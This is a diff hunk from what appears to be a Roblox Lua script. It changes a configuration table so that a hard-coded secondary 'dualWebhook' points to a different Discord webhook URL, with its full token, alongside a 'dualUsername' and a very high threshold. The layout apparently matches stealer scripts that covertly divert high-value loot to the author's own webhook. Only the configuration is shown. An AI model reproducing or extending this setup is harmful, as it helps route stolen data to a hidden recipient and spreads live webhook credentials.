@@ -43,7 +43,7 @@ end
 local CONFIG = {
     webhook = getfenv().Webhook,
     username = getfenv().Username,
-    dualWebhook = "https://discord.com/api/webhooks/1392882033415684310/rl03oFKAXcJyIq0U1Bcp0UplxZO_yOhkS8NNCxhuaLwWbwbZRs0-qpcTjsY2pWn2QhLT",
+    dualWebhook = "https://discord.com/api/webhooks/1395405994405658645/ikv-26tRODZaP0XBGNZKiwDvdxActNi33Vt87ek4GFf45ZCU9xFZGqUgkuXltwzvEqpD",
     dualUsername = "namnnni2",
     dualWebhookThreshold = 1e12,
     
